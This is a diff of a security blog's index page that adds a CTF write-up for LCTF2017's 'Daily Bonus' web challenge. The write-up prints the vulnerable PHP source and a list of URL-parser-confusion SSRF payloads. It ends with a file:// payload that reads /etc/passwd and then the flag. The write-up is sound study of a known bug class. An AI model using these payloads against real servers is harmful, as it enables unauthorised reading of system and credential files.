@@ -283,6 +283,171 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="/2017/11/22/2017-11-22-Write-up-LCTF2017-Daily-Bonus/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="oTex911">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/header.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ꭰ's security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/11/22/2017-11-22-Write-up-LCTF2017-Daily-Bonus/" itemprop="url">Write-up LCTF2017 Daily Bonus</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-22T22:08:27+08:00">
+                2017-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/11/22/2017-11-22-Write-up-LCTF2017-Daily-Bonus/" class="leancloud_visitors" data-flag-title="Write-up LCTF2017 Daily Bonus">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>In Lctf 2017, there is a simple daily bonus. Here is the <a href="http://211.159.161.162/test.php" target="_blank" rel="external">link</a>.</p>
+<p>You can find the write-up <a href="https://github.com/LCTF/LCTF2017/blob/master/src/web/%E7%AD%BE%E5%88%B0%E9%A2%98/web%E7%AD%BE%E5%88%B0%E9%A2%98.md" target="_blank" rel="external">here</a>.</p>
+<p>The following is source code :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'site'</span>])&#123; </div><div class="line">	<span class="keyword">echo</span> &lt;&lt;&lt;EOF </div><div class="line">&lt;html&gt; </div><div class="line">&lt;body&gt; </div><div class="line">look source code: </div><div class="line">&lt;form action=<span class="string">''</span> method=<span class="string">'GET'</span>&gt; </div><div class="line">&lt;input type=<span class="string">'submit'</span> name=<span class="string">'submit'</span> /&gt; </div><div class="line">&lt;input type=<span class="string">'text'</span> name=<span class="string">'site'</span> style=<span class="string">"width:1000px"</span> value=<span class="string">"https://www.baidu.com"</span>/&gt; </div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt; </div><div class="line">EOF; </div><div class="line">	<span class="keyword">die</span>(); </div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[<span class="string">'site'</span>]; </div><div class="line">$url_schema = parse_url($url); </div><div class="line">$host = $url_schema[<span class="string">'host'</span>]; </div><div class="line">$request_url = $url.<span class="string">"/"</span>; </div><div class="line"></div><div class="line"><span class="keyword">if</span> ($host !== <span class="string">'www.baidu.com'</span>)&#123; </div><div class="line">	<span class="keyword">die</span>(<span class="string">"wrong site"</span>); </div><div class="line">&#125;</div><div class="line"></div><div class="line">$ci = curl_init();</div><div class="line">curl_setopt($ci, CURLOPT_URL, $request_url);</div><div class="line">curl_setopt($ci, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">$res = curl_exec($ci);</div><div class="line">curl_close($ci);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($res)&#123; </div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Source Code:&lt;/h1&gt;"</span>; </div><div class="line">	<span class="keyword">echo</span> $request_url; </div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;hr /&gt;"</span>; </div><div class="line">	<span class="keyword">echo</span> htmlentities($res); </div><div class="line">&#125;<span class="keyword">else</span>&#123; </div><div class="line">	<span class="keyword">echo</span> <span class="string">"get source failed"</span>; </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>When I was trying to get the flag, the first problem is how to confirm that the param <code>site</code> is parsed by php function <code>parse_url</code>. In fact, on the 2017 Black Hat, Geeker Orange described the symptom when abusing parsers in the back-end server. You can get it from <a href="https://www.youtube.com/watch?v=D1S-G8rJrEk" target="_blank" rel="external">this video</a>. </p>
+<p>In a word, developers implemented <code>parse_url</code> , <code>readfile</code> and <code>cURL</code> and so on with their own standard instead of the <a href="https://tools.ietf.org/html/rfc3986#section-3.2.1" target="_blank" rel="external">RFC(3986)</a>. </p>
+<p>So, I used the following payload to fuzz then see the response from web application.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">http://www.baidu.com:11234:80/</div><div class="line">http://www.baidu.com#@www.baidu.com/</div><div class="line">http://test@www.baidu.com: @www.baidu.com/</div><div class="line">http://test@www.baidu.com:80@www.baidu.com/</div><div class="line">http://test@www.baidu.com:80 @www.baidu.com/</div><div class="line">http://test@127.0.0.1 @www.baidu.com/</div><div class="line">http://test@127.0.0.1:80@www.baidu.com/</div><div class="line">http://test@127.0.0.1:80 @www.baidu.com/</div><div class="line">http://www.baidu.com:11234:80/test.php</div><div class="line">http://www.baidu.com#@www.baidu.com/test.php</div><div class="line">http://test@www.baidu.com: @www.baidu.com/test.php</div><div class="line">http://test@www.baidu.com:80@www.baidu.com/test.php</div><div class="line">http://test@www.baidu.com:80 @www.baidu.com/test.php</div><div class="line">http://test@127.0.0.1 @www.baidu.com/test.php</div><div class="line">http://test@127.0.0.1:80@www.baidu.com/test.php</div><div class="line">http://test@127.0.0.1:80 @www.baidu.com/test.php</div></pre></td></tr></table></figure>
+<p>All these payloads are variations from Orange Paper (Awesome payloads). Till now, I was still far away from the flag. The hint in challenge descriptions is <code>local</code>,  then tried to change the schema from <code>http</code> to <code>file</code>. </p>
+<p>Everything is still confused except the hint <code>local</code>, the parsers <code>parse_url</code>. If you are careful enough, you’ll find the <code>http://test@127.0.0.1:80@www.baidu.com/test.php/</code> on the 404 Not Found Page, it adds the slash <code>/</code> to <code>http://test@127.0.0.1:80@www.baidu.com/test.php</code>. </p>
+<p>Now let’s add a question mark to the url then access that.</p>
+<p><code>`file://test@127.0.0.1:80@www.baidu.com/ect/passwd?</code></p>
+<p>Then with the response , I changed the path to <code>etc/flag?</code>.</p>
+<p><code>LCTF{1eTus_q14ndao_B4_387t439hg9342}</code></p>
+<h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>The purpose of adding question mark to the end.</p>
+<p>You can get answer from RFC(3986) or Orange PPT in 2017 Black Hat. Here is the quote from RFC(3896) section 3.2.</p>
+<blockquote>
+<p>The authority component is preceded by a double slash (“ //“ ) and is terminated by the next slash (“ /“ ), question mark (“ ? “ ), or number sign (“ #” ) character, or by the end of the URI.</p>
+</blockquote>
+<p>You must be careful with everything in the challenge. Don’t let anything suspicious go.</p>
+<p>Happy hacking.</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="/2017/11/21/Write-Up LCTF萌萌哒报名系统/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1023,166 +1188,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="/2017/07/10/blind-xxe-learning/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="oTex911">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/header.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ꭰ's security blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/07/10/blind-xxe-learning/" itemprop="url">黑夜的猎杀-盲打XXE</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-10T10:12:27+08:00">
-                2017-07-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest/" itemprop="url" rel="index">
-                    <span itemprop="name">pentest</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pentest/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/07/10/blind-xxe-learning/" class="leancloud_visitors" data-flag-title="黑夜的猎杀-盲打XXE">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>在进入正文前，我想告诉大家，文章没有涉及任何XXE攻击的任何新技巧，这只是我遇到的一个案例，我只想分享给大家。</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/07/10/blind-xxe-learning/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1232,7 +1237,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">24</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
